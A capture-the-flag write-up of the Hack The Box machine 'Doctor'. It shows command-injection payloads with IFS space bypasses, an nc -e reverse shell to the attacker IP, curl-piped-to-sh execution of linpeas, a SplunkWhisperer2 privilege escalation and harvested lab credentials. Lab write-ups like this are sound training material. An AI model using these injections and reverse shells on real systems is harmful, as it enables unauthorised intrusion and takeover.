# Doctor - Easy

### Initial recon
After the nmap scan we get only tree ports open: 22(ssh), 80(web), 8089(splunk)

### First web scan on port 80
Starting to look into the web was kindof strange because all files were `.html` and the folders weren't protected, but in the end there was nothing usefull. Though it disclosed a crucial information by putting their email adress: `info@doctors.htb`. Now we have a vhost to work with. 

### Recon on doctors.htb (port 80)
Here we have to deal with a messaging system. We can create an account, login, write a new message and update our profile. Becuase it seemed it's a new application, I decided to check the response headers on Burp and I got `Server: Werkzeug/1.0.1 Python/3.8.2`. This means that SQLi it's highly unlikely, and XSS won't work. Here I got another idea, to use the `http://<ip>/$(<bash script>)` and it worked. Even tough this is an unintended solution, it was very interesting to use and I had a few tricks to pull out. 

At first I tried `http://10.10.14.113/?file=$(id)` and got `GET /uid=1001(web)` which was only the first part of the output. Than I tried to use `http://10.10.14.113/?file=$(pwd)` and I ended up with `/home/web` which was odd. Here I took into account that the initial web scan was only html based so it must have run Apache and have the path at `/var/www/html` and I tried this `http://10.10.14.113/?file=$(whoami>/var/www/html/abx.txt)` and when I tried to access `http://10.10.10.209/abx.txt` it worked with the full output. Now the only issue I had was that `http://10.10.14.113/?file=$(cat /etc/passwd>/var/www/html/abx.txt)` wouldn't work so I couldn't build a shell payload. First try was with `${IFS}` but it didn't worked so I ended up to remove `{}` and I got a hit ` http://10.10.14.113/$(cat$IFS/etc/passwd>/var/www/html/abx.txt)`. 

Now that I could execute all unix cmds I decided it was time to get a shell, so I lised `http://10.10.14.113/$(cat$IFS/user/bin>/var/www/html/abx.txt)` and there were two ncat binaries `nc.traditional` and `nc.openbsd`. This was the payload that I leaded up to RCE: `http://10.10.14.113/$(nc.traditional$IFS-e/bin/sh$IFS'10.10.14.113'$IFS'9001')`.

### From www-data to shaun

I upgraded my shell to a `tty` one `python3 -c "__import__('pty').spawn('/bin/bash')"` and run linpeas with `curl http://10.10.14.113/linpeas.sh |sh` and looked over the files which cointained the word password. Here was what I've found: `/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"`. I tried to login using ssh but it didn't worked so I used the `su shaun` and it worked.

### From shaun to root
This was the easiest step from all because ti wasn't actually something new. During the initial user recon I found the github page (SplunkWhisperer2)[https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2] which exploited the `Splunk Atom Feed: splunkd` with the given credentials. I tried it to run locally but it didn't work becuase python2 wasn't installed, so I gone with the remote script. The final command was `python exploit.py --host 10.129.17.176 --port 8089 --lhost 10.10.14.113 --username shaun --password Guitar123 --payload "nc.traditional -e /bin/bash '10.10.14.113' '9002'"`.

### Credentials
- shaun:Guitar123